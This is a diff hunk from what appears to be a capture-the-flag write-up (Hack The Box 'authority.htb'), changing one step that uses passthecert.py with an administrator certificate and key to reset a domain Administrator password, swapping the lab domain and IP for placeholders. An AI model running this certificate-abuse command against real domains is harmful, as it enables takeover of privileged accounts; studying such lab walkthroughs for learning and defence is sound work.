@@ -60,7 +60,7 @@ certipy cert -pfx administrator.pfx -nocert -out administrator.key
 Finally, using [this github repo](https://github.com/AlmondOffSec/PassTheCert/tree/main/Python),  download the "passthecert.py" file to utilize the certificate and key to change the Administrators password:
 
 ```bash
-passthecert.py -action modify_user -target administrator -new-pass 'Pwned!!' -domain 'authority.htb' -dc-ip 10.129.250.8 -crt administrator.crt -key administrator.key
+passthecert.py -action modify_user -target administrator -new-pass 'Pwned!!' -domain 'domain.com' -dc-ip <ip> -crt administrator.crt -key administrator.key
 ```
 
 ![passthecert](./images/Pasted%20image%2020230718150333.png)
